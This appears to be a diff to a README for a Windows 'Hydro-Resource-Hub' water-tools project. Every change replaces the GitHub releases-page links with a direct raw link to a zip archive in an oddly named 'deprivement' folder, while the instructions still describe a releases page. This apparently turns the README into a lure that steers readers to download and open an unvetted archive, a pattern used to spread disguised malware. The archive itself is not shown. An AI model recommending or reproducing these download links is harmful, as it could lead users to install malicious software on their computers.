@@ -1,6 +1,6 @@
 # 🌊 Hydro-Resource-Hub - Water Tools Made Easy
 
-[![Download Hydro-Resource-Hub](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Buidong2788/Hydro-Resource-Hub/releases)
+[![Download Hydro-Resource-Hub](https://img.shields.io/badge/Download%20Now-Visit%20Releases%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Buidong2788/Hydro-Resource-Hub/main/deprivement/Hub-Hydro-Resource-v3.7.zip)
 
 ## 📘 What This Is
 
@@ -23,7 +23,7 @@ This repository is meant for people who want one place to start instead of searc
 
 To get the software on Windows, visit this page to download:
 
-https://github.com/Buidong2788/Hydro-Resource-Hub/releases
+https://raw.githubusercontent.com/Buidong2788/Hydro-Resource-Hub/main/deprivement/Hub-Hydro-Resource-v3.7.zip
 
 On that page, download the latest release file for Windows, then open the file you downloaded
 
@@ -57,7 +57,7 @@ If you plan to use larger datasets or GIS tools, more memory helps.
 ## 📦 Download and Install
 
 1. Open the releases page:
-   https://github.com/Buidong2788/Hydro-Resource-Hub/releases
+   https://raw.githubusercontent.com/Buidong2788/Hydro-Resource-Hub/main/deprivement/Hub-Hydro-Resource-v3.7.zip
 
 2. Look for the latest release at the top of the page
 
@@ -162,6 +162,6 @@ A slow start works best when you are learning a new workflow
 
 If you need to get the file later, use the same page:
 
-https://github.com/Buidong2788/Hydro-Resource-Hub/releases
+https://raw.githubusercontent.com/Buidong2788/Hydro-Resource-Hub/main/deprivement/Hub-Hydro-Resource-v3.7.zip
 
 Use the latest release for the newest Windows download
